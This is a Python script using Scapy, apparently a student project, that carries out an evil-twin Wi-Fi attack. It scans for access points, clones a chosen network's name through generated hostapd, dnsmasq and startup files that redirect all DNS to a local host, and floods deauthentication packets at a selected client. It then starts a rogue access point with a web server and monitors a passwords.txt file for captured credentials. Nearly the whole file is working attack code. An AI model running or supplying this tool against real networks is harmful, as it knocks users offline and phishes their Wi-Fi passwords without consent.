#!/usr/bin/env python

import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11, RadioTap, Dot11Deauth
import os
import time

# A list of anyone that is connected to the WIFI

wifi_list = {}

# Keeping all the MAC address

scannedNames = {}

# MAc address to attack our target

scannedMac = {}

# The desired AP to attack (MAC address)
target = ""

#Adding new MAC adress to the list

def filter_packets(packet):
    global scannedMac   
    if packet.type == 0 and packet.subtype == 8:
        if packet.addr2 not in scannedMac:
            scannedMac[packet.addr2] = packet.addr2
            scannedNames[packet.addr2] = packet.info
            print(len(scannedMac), '     %s     %s ' % (packet.addr2, packet.info))  

#connect user to Acces Point
def users_connected_to_AP(packet):
    global wifi_list
    wifi_list = {}
    client = packet[Dot11].addr3
    if target == client and not packet.haslayer(Dot11Beacon) and not packet.haslayer(Dot11ProbeReq) and not packet.haslayer(Dot11ProbeResp):
        if str(packet.summary()) not in wifi_list:
            wifi_list[str(packet.summary())] = True
            print(packet.summary())


def main():
# code to switch to monitor mode
    os.system('iwconfig')
    networkCard = input("Enter the name of the network card you want to switch to monitor mode: \n")
    os.system('sudo ifconfig ' + networkCard + ' down')
    os.system('sudo iwconfig ' + networkCard + ' mode monitor')
    os.system('sudo ifconfig ' + networkCard + ' up')
    os.system('iwconfig')
    print("Scanning for access points, please wait... or press CTRL+C to stop scanning")
    print("index         MAC            SSID")
    sniff(iface=networkCard, prn=filter_packets)

# Choose access point to attack
    global target
    global ssid_name
    if len(scannedMac) > 0:
        mac_adder = input('Please enter the BSSID address (mac-address) to attack: ')
        target = scannedMac[mac_adder]
        ssid_name = scannedNames[mac_adder]
        print("target = " + str(target) + " , ssid_name = " + str(ssid_name)[2:-1] )

#dynamic changes to hostapd.conf, dnsmasq.conf, startAP.sh files according to the AP they want to attack

#dynamicaly changing hostapd.conf
        filename = "/root/matala/hostapd.conf"
        text = str("#Set wifi interface\n" + 
        "interface=" + str(networkCard) + "\n" +
        "#Set network name\n" + 
        "ssid=" + str(ssid_name)[2:-1] + "\n" + 
        "#Set channel\n" + 
        "channel=1\n" + 
        "#Set driver\n" + 
        "driver=nl80211")
        f = open(filename,'w')
        f.close()
        f = open(filename,'w')
        f.write(text)
        f.close()

#dynamicaly changing dnsmasq.conf
        filename = "/root/matala/dnsmasq.conf"
        text = str("#Set the wifi interface\n" + 
        "interface=" + str(networkCard) + "\n" +
        "#Configure ip range for clients for 8 hours\n" + 
        "dhcp-range=10.0.0.10,10.0.0.100,8h\n" + 
        "#Set the gateway IP address\n" + 
        "dhcp-option=3,10.0.0.1\n" + 
        "#Set dns server address\n" + 
        "dhcp-option=6,10.0.0.1\n" + 
        "#Redirect all requests \n" + 
        "address=/#/10.0.0.1\n")
        f = open(filename,'w')
        f.close()
        f = open(filename,'w')
        f.write(text)
        f.close()

#dynamicaly changing startAP.sh
        filename = "/root/matala/startAP.sh"
        text = str("#!/bin/sh\n" +
        "service NetworkManager stop\n" +
	"airmon-ng check kill\n" +
	"ifconfig " + str(networkCard) + " 10.0.0.1/24\n" +
        "ifconfig " + str(networkCard) + " 10.0.0.1 netmask 255.255.255.0\n" +
        "route add default gw 10.0.0.1\n" +
        "echo 1 > /proc/sys/net/ipv4/ip_forward\n" +
        "iptables --flush\n" +
        "iptables --table nat --flush\n" +
        "iptables --delete-chain\n" +
        "iptables --table nat --delete-chain\n" +
        "iptables -P FORWARD ACCEPT\n" +
        "dnsmasq -C /root/matala/dnsmasq.conf\n" +
        "hostapd /root/matala/hostapd.conf\n" +
        "service apache2 start\n")
        f = open(filename,'w')
        f.close()
        f = open(filename,'w')
        f.write(text)
        f.close()


        print("checking for clients connected to this AP. press CTRL+C to stop scanning")
        print ("index       Client MAC")
        try:
            sniff(iface=networkCard, prn=users_connected_to_AP)
        except:
            pass

        user_adder = input(
            "Enter the ssid of the client you want to attack: \n  ")


        packet = RadioTap() / Dot11(addr1=user_adder, addr2=target, addr3=target) / Dot11Deauth()
        
	
        # sending the deauthentication packet to the mac address we want to attack
        try:
            while(True):
                sendp(packet, iface=networkCard, count=100)
                time.sleep(1)
           
        except:
            pass

        os.system("./startAP.sh")
        print("hereee2")
# looking for changes in the password, if we saw one we catch it and put it in passwords.txt
        try:
            while True:
                os.system("clear")
                print("Waiting for passwords from users... press Ctrl C to stop")
                os.system("cat /var/www/html/passwords.txt")
                time.sleep(0.5)
        except:
            pass
            
        os.system("./stopAP.sh")

main()
